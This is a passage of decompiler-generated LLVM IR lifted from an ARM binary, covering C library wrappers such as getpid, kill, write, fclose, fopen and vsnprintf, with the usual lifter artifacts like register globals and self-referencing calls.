  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_ab1c, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_aaac, { 1, 0 }
  uselistorder label %dec_label_pc_aa9c, { 0, 2, 1 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v2_ab28 = load i32, i32* @global_var_20e18.396, align 4
  %v2_ab2c = icmp eq i32 %v2_ab28, 0
  br i1 %v2_ab2c, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_ab34 = phi i32 [ %v2_ab28, %entry ], [ 4096, %bb ]
  ret i32 %v1_ab34

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ab3c = load i32, i32* @r4, align 4
  store i32 %v3_ab3c, i32* %stack_var_-8, align 4
  %v0_ab40 = call i32 @getpid()
  store i32 %v0_ab40, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ab40, -4095
  br i1 %tmp, label %dec_label_pc_ab60, label %dec_label_pc_ab50

dec_label_pc_ab50:                                ; preds = %entry
  %v0_ab50 = call i32 @__errno_location()
  %v0_ab54 = load i32, i32* %r4.global-to-local, align 4
  %v1_ab54 = sub i32 0, %v0_ab54
  %v2_ab58 = inttoptr i32 %v0_ab50 to i32*
  store i32 %v1_ab54, i32* %v2_ab58, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ab60

dec_label_pc_ab60:                                ; preds = %entry, %dec_label_pc_ab50
  %v0_ab60 = phi i32 [ %v0_ab40, %entry ], [ -1, %dec_label_pc_ab50 ]
  %v2_ab64 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ab64, i32* @r4, align 4
  ret i32 %v0_ab60

; uselistorder directives
  uselistorder i32 %v0_ab40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ab60, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ab68 = load i32, i32* @r4, align 4
  store i32 %v3_ab68, i32* %stack_var_-8, align 4
  %v0_ab6c = call i32 @getppid()
  store i32 %v0_ab6c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ab6c, -4095
  br i1 %tmp, label %dec_label_pc_ab8c, label %dec_label_pc_ab7c

dec_label_pc_ab7c:                                ; preds = %entry
  %v0_ab7c = call i32 @__errno_location()
  %v0_ab80 = load i32, i32* %r4.global-to-local, align 4
  %v1_ab80 = sub i32 0, %v0_ab80
  %v2_ab84 = inttoptr i32 %v0_ab7c to i32*
  store i32 %v1_ab80, i32* %v2_ab84, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ab8c

dec_label_pc_ab8c:                                ; preds = %entry, %dec_label_pc_ab7c
  %v0_ab8c = phi i32 [ %v0_ab6c, %entry ], [ -1, %dec_label_pc_ab7c ]
  %v2_ab90 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ab90, i32* @r4, align 4
  ret i32 %v0_ab8c

; uselistorder directives
  uselistorder i32 %v0_ab6c, { 1, 0, 2 }
  uselistorder i32 ()* @getppid, { 1, 0 }
  uselistorder label %dec_label_pc_ab8c, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_abb0 = load i32, i32* @r0, align 4
  %v3_abb0 = call i32 @ioctl(i32 %v0_abb0, i32 %arg1, i32 %arg2)
  store i32 %v3_abb0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_abb0, -4095
  br i1 %tmp, label %dec_label_pc_abd0, label %dec_label_pc_abc0

dec_label_pc_abc0:                                ; preds = %entry
  %v0_abc0 = call i32 @__errno_location()
  %v0_abc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_abc4 = sub i32 0, %v0_abc4
  %v2_abc8 = inttoptr i32 %v0_abc0 to i32*
  store i32 %v1_abc4, i32* %v2_abc8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_abd0

dec_label_pc_abd0:                                ; preds = %entry, %dec_label_pc_abc0
  %v0_abd0 = phi i32 [ %v3_abb0, %entry ], [ -1, %dec_label_pc_abc0 ]
  ret i32 %v0_abd0

; uselistorder directives
  uselistorder i32 %v3_abb0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_abd0, { 1, 0 }
}

define i32 @kill() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_abe4 = load i32, i32* @r4, align 4
  store i32 %v3_abe4, i32* %stack_var_-8, align 4
  %v0_abe8 = call i32 @kill()
  store i32 %v0_abe8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_abe8, -4095
  br i1 %tmp, label %dec_label_pc_ac08, label %dec_label_pc_abf8

dec_label_pc_abf8:                                ; preds = %entry
  %v0_abf8 = call i32 @__errno_location()
  %v0_abfc = load i32, i32* %r4.global-to-local, align 4
  %v1_abfc = sub i32 0, %v0_abfc
  %v2_ac00 = inttoptr i32 %v0_abf8 to i32*
  store i32 %v1_abfc, i32* %v2_ac00, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ac08

dec_label_pc_ac08:                                ; preds = %entry, %dec_label_pc_abf8
  %v0_ac08 = phi i32 [ %v0_abe8, %entry ], [ -1, %dec_label_pc_abf8 ]
  %v2_ac0c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ac0c, i32* @r4, align 4
  ret i32 %v0_ac08

; uselistorder directives
  uselistorder i32 %v0_abe8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ac08, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ac10 = load i32, i32* @r4, align 4
  store i32 %v3_ac10, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_ac38, label %dec_label_pc_ac28

dec_label_pc_ac28:                                ; preds = %entry
  %v0_ac28 = call i32 @__errno_location()
  %v0_ac2c = load i32, i32* %r4.global-to-local, align 4
  %v1_ac2c = sub i32 0, %v0_ac2c
  %v2_ac30 = inttoptr i32 %v0_ac28 to i32*
  store i32 %v1_ac2c, i32* %v2_ac30, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_ac3c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ac38

dec_label_pc_ac38:                                ; preds = %entry, %dec_label_pc_ac28
  %v2_ac3c = phi i32 [ %v3_ac10, %entry ], [ %v2_ac3c.pre, %dec_label_pc_ac28 ]
  %v0_ac38 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_ac28 ]
  store i32 %v2_ac3c, i32* @r4, align 4
  ret i32 %v0_ac38

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ac38, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ac40 = load i32, i32* @r4, align 4
  store i32 %v3_ac40, i32* %stack_var_-8, align 4
  %v2_ac44 = call i32 @time(i32* %arg1)
  store i32 %v2_ac44, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_ac44, -4095
  br i1 %tmp, label %dec_label_pc_ac64, label %dec_label_pc_ac54

dec_label_pc_ac54:                                ; preds = %entry
  %v0_ac54 = call i32 @__errno_location()
  %v0_ac58 = load i32, i32* %r4.global-to-local, align 4
  %v1_ac58 = sub i32 0, %v0_ac58
  %v2_ac5c = inttoptr i32 %v0_ac54 to i32*
  store i32 %v1_ac58, i32* %v2_ac5c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ac64

dec_label_pc_ac64:                                ; preds = %entry, %dec_label_pc_ac54
  %v0_ac64 = phi i32 [ %v2_ac44, %entry ], [ -1, %dec_label_pc_ac54 ]
  %v2_ac68 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ac68, i32* @r4, align 4
  ret i32 %v0_ac64

; uselistorder directives
  uselistorder i32 %v2_ac44, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ac64, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_ac70 = call i32 @wait4()
  ret i32 %v0_ac70
}

define i32 @__libc_write(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ac74 = load i32, i32* @r4, align 4
  store i32 %v3_ac74, i32* %stack_var_-8, align 4
  %v3_ac78 = load i32, i32* @r2, align 4
  %v4_ac78 = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_ac78)
  store i32 %v4_ac78, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_ac78, -4095
  br i1 %tmp, label %dec_label_pc_ac98, label %dec_label_pc_ac88

dec_label_pc_ac88:                                ; preds = %entry
  %v0_ac88 = call i32 @__errno_location()
  %v0_ac8c = load i32, i32* %r4.global-to-local, align 4
  %v1_ac8c = sub i32 0, %v0_ac8c
  %v2_ac90 = inttoptr i32 %v0_ac88 to i32*
  store i32 %v1_ac8c, i32* %v2_ac90, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ac98

dec_label_pc_ac98:                                ; preds = %entry, %dec_label_pc_ac88
  %v0_ac98 = phi i32 [ %v4_ac78, %entry ], [ -1, %dec_label_pc_ac88 ]
  %v2_ac9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ac9c, i32* @r4, align 4
  ret i32 %v0_ac98

; uselistorder directives
  uselistorder i32 %v4_ac78, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ac98, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_aca8 = icmp slt i32 %arg1, 0
  br i1 %v1_aca8, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_aca8 = mul i32 %arg1, 2
  %v2_acb4 = load i32, i32* @global_var_1e470, align 4
  %v2_acb8 = add i32 %v2_acb4, %v2_aca8
  %v3_acbc = inttoptr i32 %v2_acb8 to i8*
  %v4_acbc = load i8, i8* %v3_acbc, align 1
  %v6_acbc = zext i8 %v4_acbc to i32
  %v1_acc0 = add i32 %v2_acb8, 1
  %v2_acc0 = inttoptr i32 %v1_acc0 to i8*
  %v3_acc0 = load i8, i8* %v2_acc0, align 1
  %v4_acc0 = zext i8 %v3_acc0 to i32
  %v3_acc4 = mul nuw i32 %v4_acc0, 16777216
  %v4_acc8 = sdiv i32 %v3_acc4, 65536
  %v5_acc8 = or i32 %v4_acc8, %v6_acbc
  ret i32 %v5_acc8

; uselistorder directives
  uselistorder i32 %v2_acb8, { 1, 0 }
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_20e28.403 to i32)
}

define i32 @__GI_fclose(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_ace0 = load i32, i32* @r4, align 4
  store i32 %v3_ace0, i32* %stack_var_-32, align 4
  %v6_ace0 = load i32, i32* @r5, align 4
  %v9_ace0 = load i32, i32* @r6, align 4
  %v12_ace0 = load i32, i32* @r7, align 4
  %v15_ace0 = load i32, i32* @r8, align 4
  %v2_ace4 = add i32 %tmp, 52
  %v3_ace4 = inttoptr i32 %v2_ace4 to i32*
  %v4_ace4 = load i32, i32* %v3_ace4, align 4
  store i32 %v4_ace4, i32* @r8, align 4
  %v2_ace8 = add i32 %tmp, 56
  store i32 %v2_ace8, i32* @r5, align 4
  %v2_acec = ptrtoint i32* %stack_var_-64 to i32
  %v2_acf0 = icmp eq i32 %v4_ace4, 0
  store i1 %v2_acf0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  %v2_ad00 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_ad00, i32* @r0, align 4
  br i1 %v2_acf0, label %dec_label_pc_ad08, label %dec_label_pc_ad24

dec_label_pc_ad08:                                ; preds = %entry
  store i32 58724, i32* %r3.global-to-local, align 4
  %v1_ad10 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_e55c.405 to i32), i32* %r3.global-to-local, align 4
  %v1_ad20 = call i32 @__pthread_return_0()
  %v0_ad24.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad24

dec_label_pc_ad24:                                ; preds = %entry, %dec_label_pc_ad08
  %v0_ad2c = phi i32 [ %tmp, %entry ], [ %v0_ad24.pre, %dec_label_pc_ad08 ]
  %v1_ad24 = inttoptr i32 %v0_ad2c to i8*
  %v2_ad24 = load i8, i8* %v1_ad24, align 1
  %v3_ad24 = zext i8 %v2_ad24 to i32
  %v1_ad28 = and i32 %v3_ad24, 64
  store i32 %v1_ad28, i32* %r3.global-to-local, align 4
  %v2_ad28 = icmp eq i32 %v1_ad28, 0
  store i1 %v2_ad28, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ad28, i32* @r7, align 4
  br i1 %v2_ad28, label %dec_label_pc_ad40, label %dec_label_pc_ad38

dec_label_pc_ad38:                                ; preds = %dec_label_pc_ad24
  %v3_ad38 = call i32 @fflush_unlocked(i8* %v1_ad24)
  store i32 %v3_ad38, i32* @r7, align 4
  %v0_ad40.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad40

dec_label_pc_ad40:                                ; preds = %dec_label_pc_ad24, %dec_label_pc_ad38
  %v0_ad40 = phi i32 [ %v0_ad2c, %dec_label_pc_ad24 ], [ %v0_ad40.pre, %dec_label_pc_ad38 ]
  %v1_ad40 = add i32 %v0_ad40, 4
  %v2_ad40 = inttoptr i32 %v1_ad40 to i32*
  %v3_ad40 = load i32, i32* %v2_ad40, align 4
  %v1_ad44 = call i32 @__libc_close(i32 %v3_ad40)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_ad4c = icmp slt i32 %v1_ad44, 0
  %v2_ad4c = icmp eq i32 %v1_ad44, 0
  store i1 %v2_ad4c, i1* %cpsr_z.global-to-local, align 1
  %v1_ad50 = load i32, i32* @r4, align 4
  %v2_ad50 = add i32 %v1_ad50, 4
  %v3_ad50 = inttoptr i32 %v2_ad50 to i32*
  store i32 -1, i32* %v3_ad50, align 4
  store i32 %v2_acec, i32* @r0, align 4
  br i1 %v1_ad4c, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_ad40
  %v3_ad64 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_ad64, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_ad40, %bb
  %v1_ad70 = call i32 @__pthread_return_void()
  %v1_ad7c = call i32 @__pthread_return_0()
  %v2_ad84 = load i32, i32* @global_var_1ec04.411, align 4
  %v1_ad88 = add i32 %v2_ad84, 1
  store i32 %v1_ad88, i32* %r3.global-to-local, align 4
  store i32 %v1_ad88, i32* @global_var_1ec04.411, align 4
  store i32 %v2_acec, i32* @r0, align 4
  %v1_ada0 = call i32 @__pthread_return_void()
  %v0_ada4 = load i32, i32* @r4, align 4
  %v1_ada4 = inttoptr i32 %v0_ada4 to i32*
  %v2_ada4 = load i32, i32* %v1_ada4, align 4
  %v1_ada8 = and i32 %v2_ada4, 24576
  store i32 %v1_ada8, i32* %r3.global-to-local, align 4
  %v3_adac1 = udiv i32 %v1_ada8, 256
  %v1_adb0 = trunc i32 %v3_adac1 to i8
  %v3_adb0 = add i32 %v0_ada4, 1
  %v4_adb0 = inttoptr i32 %v3_adb0 to i8*
  store i8 %v1_adb0, i8* %v4_adb0, align 1
  %v0_adb4 = load i32, i32* %r3.global-to-local, align 4
  %v1_adb4 = trunc i32 %v0_adb4 to i8
  %v2_adb4 = load i32, i32* @r4, align 4
  %v3_adb4 = inttoptr i32 %v2_adb4 to i8*
  store i8 %v1_adb4, i8* %v3_adb4, align 1
  %v0_adb8 = load i32, i32* @r4, align 4
  %v1_adb8 = inttoptr i32 %v0_adb8 to i32*
  %v2_adb8 = load i32, i32* %v1_adb8, align 4
  %v1_adbc = or i32 %v2_adb8, 48
  store i32 %v1_adbc, i32* %r3.global-to-local, align 4
  %v3_adc0 = sdiv i32 %v2_adb8, 256
  %v0_adc4 = load i32, i32* @r8, align 4
  %v2_adc4 = icmp eq i32 %v0_adc4, 0
  store i1 %v2_adc4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_ad00, i32* @r0, align 4
  %v1_add4 = trunc i32 %v3_adc0 to i8
  %v3_add4 = add i32 %v0_adb8, 1
  %v4_add4 = inttoptr i32 %v3_add4 to i8*
  store i8 %v1_add4, i8* %v4_add4, align 1
  %v0_add8 = load i32, i32* %r3.global-to-local, align 4
  %v1_add8 = trunc i32 %v0_add8 to i8
  %v2_add8 = load i32, i32* @r4, align 4
  %v3_add8 = inttoptr i32 %v2_add8 to i8*
  store i8 %v1_add8, i8* %v3_add8, align 1
  %v0_addc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_addc, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  %v2_ade0 = call i32 @__pthread_return_void()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_ade4 = load i32, i32* @r4, align 4
  %v1_ade4 = add i32 %v0_ade4, 1
  %v2_ade4 = inttoptr i32 %v1_ade4 to i8*
  %v3_ade4 = load i8, i8* %v2_ade4, align 1
  %v4_ade4 = zext i8 %v3_ade4 to i32
  store i32 %v4_ade4, i32* %r3.global-to-local, align 4
  %v1_ade8 = and i32 %v4_ade4, 64
  %v2_ade8 = icmp eq i32 %v1_ade8, 0
  store i1 %v2_ade8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ade8, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_adf0 = xor i1 %v2_ade8, true
  call void @__pseudo_cond_branch(i1 %v1_adf0, i32 ptrtoint (i32* @global_var_d4a4.413 to i32))
  store i32 %v2_acec, i32* @r0, align 4
  %v1_ae04 = call i32 @__pthread_return_void()
  %v1_ae10 = call i32 @__pthread_return_0()
  %v2_ae18 = load i32, i32* @global_var_1ec08.416, align 4
  %v1_ae1c = add i32 %v2_ae18, 1
  store i32 %v1_ae1c, i32* %r3.global-to-local, align 4
  store i32 %v2_acec, i32* @r0, align 4
  store i32 %v1_ae1c, i32* @global_var_1ec08.416, align 4
  %v1_ae30 = call i32 @__pthread_return_void()
  %v1_ae34 = call i32 @_stdio_openlist_dec_use(i32 %v1_ae30)
  %v0_ae38 = load i32, i32* @r7, align 4
  %v2_ae40 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_ae40, i32* @r4, align 4
  store i32 %v6_ace0, i32* @r5, align 4
  store i32 %v9_ace0, i32* @r6, align 4
  store i32 %v12_ace0, i32* @r7, align 4
  store i32 %v15_ace0, i32* @r8, align 4
  ret i32 %v0_ae38

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_ad40, { 1, 0 }
  uselistorder label %dec_label_pc_ad24, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_ae68 = call i32 @_stdio_fopen()
  ret i32 %v0_ae68
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  store i32 -1, i32* @r1, align 4
  %v0_ae78 = call i32 @__GI_vsnprintf()
  ret i32 %v0_ae78
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_ae88 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_ae88, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_ae9c = call i32 @__GI_vsnprintf()
  ret i32 %v0_ae9c

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_aeb0 = load i32, i32* @r4, align 4
  %v6_aeb0 = load i32, i32* @r5, align 4
  %v12_aeb0 = load i32, i32* @r7, align 4
  %v15_aeb0 = load i32, i32* @r8, align 4
  %v18_aeb0 = load i32, i32* @sl, align 4
  %v0_aeb4 = load i32, i32* @r3, align 4
  store i32 %v0_aeb4, i32* @r8, align 4
  %v2_aeb8 = ptrtoint i32* %stack_var_-108 to i32
  %v0_aec0 = load i32, i32* @r0, align 4
  %v1_aec0 = sub i32 -1, %v0_aec0
  store i32 %v1_aec0, i32* @r5, align 4
  store i32 %v0_aec0, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_aed4 = load i32, i32* @r1, align 4
  %v3_aed4 = icmp ult i32 %v1_aec0, %v1_aed4
  br i1 %v3_aed4, label %bb23, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_aed4, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %entry, %bb
  %v0_aedc = load i32, i32* @r2, align 4
  store i32 %v0_aedc, i32* @r7, align 4
  %v2_aee0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_aee0, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  store i32 1, i32* @r3, align 4
  %v0_aefc = call i32 @__stdio_init_mutex()
  %v0_af00 = load i32, i32* @r4, align 4
  %v1_af00 = load i32, i32* @r5, align 4
  %v2_af00 = add i32 %v1_af00, %v0_af00
  %v0_af08 = load i32, i32* @r7, align 4
  %v0_af0c = load i32, i32* @r8, align 4
  %v0_af18 = load i32, i32* @sl, align 4
  %v12_af2c = inttoptr i32 %v0_af08 to i8*
  %v13_af2c = call i32 @_vfprintf_internal(i32 %v2_aeb8, i8* %v12_af2c, i32 %v0_af0c, i32 %v2_af00, i32 %v0_af00, i32 %v2_af00, i32 %v0_af00, i32 %v0_af00, i32 %v0_af00, i32 %v2_af00, i32 %v0_af18)
  %v0_af30 = load i32, i32* @r5, align 4
  %v1_af30 = load i32, i32* @sl, align 4
  %v9_af30 = icmp eq i32 %v0_af30, %v1_af30
  br i1 %v9_af30, label %dec_label_pc_af58, label %dec_label_pc_af3c

dec_label_pc_af3c:                                ; preds = %bb23
  %v9_af44 = icmp eq i32 %v1_af00, 0
  %v1_af48 = sext i1 %v9_af44 to i32
  %v1_af48.v0_af10 = add i32 %v0_af00, %v1_af48
  %stack_var_-92.0 = inttoptr i32 %v1_af48.v0_af10 to i8*
  %v1_af54 = trunc i32 %v1_af30 to i8
  store i8 %v1_af54, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_af58

dec_label_pc_af58:                                ; preds = %bb23, %dec_label_pc_af3c
  store i32 %v3_aeb0, i32* @r4, align 4
  store i32 %v6_aeb0, i32* @r5, align 4
  store i32 %v12_aeb0, i32* @r7, align 4
  store i32 %v15_aeb0, i32* @r8, align 4
  store i32 %v18_aeb0, i32* @sl, align 4
  ret i32 %v13_af2c

; uselistorder directives
  uselistorder i32 %v1_af00, { 1, 0 }
  uselistorder i32 %v0_af00, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 %v1_aed4, { 1, 0 }
  uselistorder i32 %v0_aec0, { 1, 0 }
  uselistorder label %dec_label_pc_af58, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_af60 = load i32, i32* @r4, align 4
  store i32 %v3_af60, i32* %stack_var_-24, align 4
  %v6_af60 = load i32, i32* @r5, align 4
  %v9_af60 = load i32, i32* @r6, align 4
  %v15_af60 = load i32, i32* @r8, align 4
  %v0_af64 = load i32, i32* @r1, align 4
  %v1_af64 = inttoptr i32 %v0_af64 to i8*
  %v2_af64 = load i8, i8* %v1_af64, align 1
  %v7_af68 = icmp eq i8 %v2_af64, 114
  store i1 %v7_af68, i1* %cpsr_z.global-to-local, align 1
  %v2_af6c = ptrtoint i32* %stack_var_-56 to i32
  %v0_af70 = load i32, i32* @r0, align 4
  store i32 %v0_af70, i32* @r6, align 4
  %v0_af74 = load i32, i32* @r2, align 4
  store i32 %v0_af74, i32* @r8, align 4
  %v0_af78 = load i32, i32* @r3, align 4
  store i32 %v0_af78, i32* @r5, align 4
  br i1 %v7_af68, label %dec_label_pc_afc4, label %dec_label_pc_af80

dec_label_pc_af80:                                ; preds = %entry
  %v7_af80 = icmp eq i8 %v2_af64, 119
  store i1 %v7_af80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_af80, label %bb, label %dec_label_pc_af8c

bb:                                               ; preds = %dec_label_pc_af80
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_afc8

dec_label_pc_af8c:                                ; preds = %dec_label_pc_af80
  %v7_af8c = icmp eq i8 %v2_af64, 97
  store i1 %v7_af8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_af8c, label %bb30, label %dec_label_pc_af98

bb30:                                             ; preds = %dec_label_pc_af8c
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_afc8

dec_label_pc_af98:                                ; preds = %dec_label_pc_af8c, %dec_label_pc_b050, %dec_label_pc_b024
  %v0_af98 = call i32 @__errno_location()
  store i32 %v0_af98, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_afa0 = load i32, i32* @r8, align 4
  %v2_afa0 = icmp eq i32 %v0_afa0, 0
  store i1 %v2_afa0, i1* %cpsr_z.global-to-local, align 1
  %v2_afa4 = inttoptr i32 %v0_af98 to i32*
  store i32 22, i32* %v2_afa4, align 4
  br i1 %v2_afa0, label %dec_label_pc_b218, label %dec_label_pc_afac

dec_label_pc_afac:                                ; preds = %dec_label_pc_b074._crit_edge, %dec_label_pc_af98
  %v0_afac = load i32, i32* @r8, align 4
  %v1_afac = add i32 %v0_afac, 1
  %v2_afac = inttoptr i32 %v1_afac to i8*
  %v3_afac = load i8, i8* %v2_afac, align 1
  %v4_afac = zext i8 %v3_afac to i32
  store i32 %v4_afac, i32* %r3.global-to-local, align 4
  %v1_afb0 = and i32 %v4_afac, 32
  %v2_afb0 = icmp eq i32 %v1_afb0, 0
  store i1 %v2_afb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_afb0, label %dec_label_pc_b218, label %dec_label_pc_afb8

dec_label_pc_afb8:                                ; preds = %dec_label_pc_afac
  store i32 %v0_afac, i32* @r0, align 4
  %v0_afbc = call i32 @free()
  store i32 %v0_afbc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b218

dec_label_pc_afc4:                                ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_afc8

dec_label_pc_afc8:                                ; preds = %bb, %bb30, %dec_label_pc_afc4
  %v1_afe0 = phi i32 [ 1089, %bb30 ], [ 577, %bb ], [ 1, %dec_label_pc_afc4 ]
  %v1_afc8 = add i32 %v0_af64, 1
  %v2_afc8 = inttoptr i32 %v1_afc8 to i8*
  %v3_afc8 = load i8, i8* %v2_afc8, align 1
  %v7_afcc = icmp eq i8 %v3_afc8, 98
  store i1 %v7_afcc, i1* %cpsr_z.global-to-local, align 1
  %v1_afc8.v0_af64 = select i1 %v7_afcc, i32 %v1_afc8, i32 %v0_af64
  store i32 %v1_afc8.v0_af64, i32* %r3.global-to-local, align 4
  %v1_afd8 = add i32 %v1_afc8.v0_af64, 1
  %v2_afd8 = inttoptr i32 %v1_afd8 to i8*
  %v3_afd8 = load i8, i8* %v2_afd8, align 1
  %v4_afd8 = zext i8 %v3_afd8 to i32
  store i32 %v4_afd8, i32* %r3.global-to-local, align 4
  %v7_afdc = icmp eq i8 %v3_afd8, 43
  store i1 %v7_afdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_afdc, label %bb33, label %.thread4

bb33:                                             ; preds = %dec_label_pc_afc8
  store i32 %v1_afe0, i32* %r3.global-to-local, align 4
  %v2_afe4 = add nuw nsw i32 %v1_afe0, 1
  store i32 %v2_afe4, i32* @r4, align 4
  br label %.thread4

